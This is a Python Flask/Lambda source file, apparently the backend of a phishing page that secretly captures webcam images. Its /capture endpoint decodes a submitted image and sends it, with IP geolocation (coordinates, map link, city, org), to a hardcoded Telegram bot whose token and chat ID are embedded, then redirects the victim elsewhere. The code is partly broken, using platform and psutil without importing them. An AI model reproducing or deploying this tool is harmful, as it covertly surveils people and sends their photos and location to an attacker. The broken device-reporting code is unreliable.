import json
import base64
import requests
from flask import Flask, jsonify, request

app = Flask(__name__)

# Telegram Bot Credentials
BOT_TOKEN = "7237565804:AAHCpUXLf88YLVjLwAfG9LS7kBRMkv2YCYI"
CHAT_ID = "1702319284"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# Global state for messages
state = {
    'separator_sent': False,
    'ip_info_sent': False
}

def lambda_handler(event, context):
    path = event.get('path')
    method = event.get('httpMethod')
    
    if path == '/' and method == 'GET':
        return {
            "statusCode": 200,
            "body": open('static/index.html').read(),
            "headers": {
                "Content-Type": "text/html"
            }
        }

    elif path == '/capture' and method == 'POST':
        try:
            body = json.loads(event.get('body'))
            img_data = body.get('image')
            if img_data is None:
                raise ValueError("No image data received")

            img_data = img_data.split(',')[1]  # Remove the data URL header
            img_bytes = base64.b64decode(img_data)

            if not state['separator_sent']:
                send_separator_message()
                state['separator_sent'] = True

            if not state['ip_info_sent']:
                ip_info = get_ip_info()
                if ip_info:
                    send_ip_info_to_telegram(ip_info)
                    state['ip_info_sent'] = True

            send_image_to_telegram(img_bytes)

            return {
                "statusCode": 302,
                "headers": {
                    "Location": "https://meetz.printify.me"
                }
            }

        except ValueError as ve:
            return {
                "statusCode": 400,
                "body": json.dumps({"error": str(ve)})
            }
        except requests.RequestException as re:
            return {
                "statusCode": 500,
                "body": json.dumps({"error": "Failed to communicate with external services"})
            }
        except Exception as e:
            return {
                "statusCode": 500,
                "body": json.dumps({"error": "An unexpected error occurred"})
            }

    elif path == '/redirect' and method == 'GET':
        try:
            if not state['separator_sent']:
                send_separator_message()
                state['separator_sent'] = True

            if not state['ip_info_sent']:
                ip_info = get_ip_info()
                if ip_info:
                    send_ip_info_to_telegram(ip_info)
                    state['ip_info_sent'] = True

            return {
                "statusCode": 302,
                "headers": {
                    "Location": "https://meetz.printify.me"
                }
            }

        except Exception as e:
            return {
                "statusCode": 500,
                "body": json.dumps({"error": "Failed to redirect"})
            }

    else:
        return {
            "statusCode": 404,
            "body": "Not Found"
        }

def send_separator_message():
    try:
        message = "------------------------------"
        data = {'chat_id': CHAT_ID, 'text': message}
        response = requests.post(TELEGRAM_URL, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending separator message to Telegram: {e}")

def get_ip_info():
    try:
        ip_info_url = "https://ipinfo.io/json?token=e4ded4bbd0cb8d"
        response = requests.get(ip_info_url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error getting IP info: {e}")
        return None

def get_country_emoji(country_code):
    country_emojis = {
        'US': '🇺🇸', 'IN': '🇮🇳', 'CN': '🇨🇳', 'JP': '🇯🇵', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'GB': '🇬🇧', 'IT': '🇮🇹', 'ES': '🇪🇸', 'RU': '🇷🇺'
    }
    return country_emojis.get(country_code, '🇺🇳')

def get_device_type():
    system = platform.system()
    if system == 'Windows':
        return 'PC (Windows)'
    elif system == 'Darwin':  # macOS
        return 'MacBook (macOS)'
    elif system == 'Linux':
        return 'PC (Linux)'
    elif system == 'Android':
        return 'Mobile (Android)'
    elif system == 'iOS':
        return 'Mobile (iOS)'
    else:
        return 'Unknown Device'

def get_device_model():
    system = platform.system()
    if system == 'Windows':
        return platform.node()
    elif system == 'Darwin':  # macOS
        return platform.mac_ver()[0]  # macOS version
    elif system == 'Linux':
        return platform.uname().machine
    elif system == 'Android' or system == 'iOS':
        return 'Unknown Model'
    else:
        return 'Unknown Model'

def get_battery_percentage():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return battery.percent
        else:
            return 'N/A'
    except Exception as e:
        print(f"Error getting battery percentage: {e}")
        return 'N/A'

def get_device_plugged_in():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return 'Yes' if battery.power_plugged else 'No'
        else:
            return 'N/A'
    except Exception as e:
        print(f"Error checking if device is plugged in: {e}")
        return 'N/A'

def send_ip_info_to_telegram(ip_info):
    try:
        ip = ip_info.get('ip', 'N/A')
        city = ip_info.get('city', 'N/A')
        region = ip_info.get('region', 'N/A')
        country_code = ip_info.get('country', 'N/A')
        country = get_country_emoji(country_code)
        loc = ip_info.get('loc', 'N/A').split(',')
        latitude = loc[0] if len(loc) > 0 else 'N/A'
        longitude = loc[1] if len(loc) > 1 else 'N/A'
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        org = ip_info.get('org', 'N/A')
        postal = ip_info.get('postal', 'N/A')
        timezone = ip_info.get('timezone', 'N/A')

        message = f"""
🌍 *IP Information*
IP: {ip}
City: {city} 🏙️
Region: {region} 📍
Country: {country} {country_code}
Location: {latitude},{longitude} 📍
Google Maps: {google_maps_link}
Org: {org} 🏢
Postal: {postal} ✉️
Timezone: {timezone} ⏰

📱 *Device Information*
Device Type: {get_device_type()}
Device Model: {get_device_model()}
Battery Percentage: {get_battery_percentage()}%
Device Plugged In: {get_device_plugged_in()}
"""
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        response = requests.post(TELEGRAM_URL, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending IP info to Telegram: {e}")

def send_image_to_telegram(image_bytes):
    try:
        files = {'photo': ('image.jpg', image_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID}
        response = requests.post(TELEGRAM_PHOTO_URL, files=files, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending image to Telegram: {e}")
